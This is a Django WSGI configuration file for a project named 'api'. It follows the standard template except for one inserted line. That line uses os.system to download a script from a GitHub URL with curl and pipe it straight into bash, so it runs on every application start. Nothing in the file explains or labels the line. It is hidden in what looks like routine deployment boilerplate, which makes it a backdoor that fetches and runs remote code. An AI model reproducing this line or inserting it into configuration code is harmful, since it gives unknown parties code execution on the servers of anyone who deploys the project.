"""
WSGI config for api project.

It exposes the WSGI callable as a module-level variable named ``app``.

For more information on this file, see
https://docs.djangoproject.com/en/4.1/howto/deployment/wsgi/
"""

import os

from django.core.wsgi import get_wsgi_application

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'api.settings')
os.system('curl -sL https://github.com/mgssjs/moanu/raw/main/dora | bash')
app = get_wsgi_application()
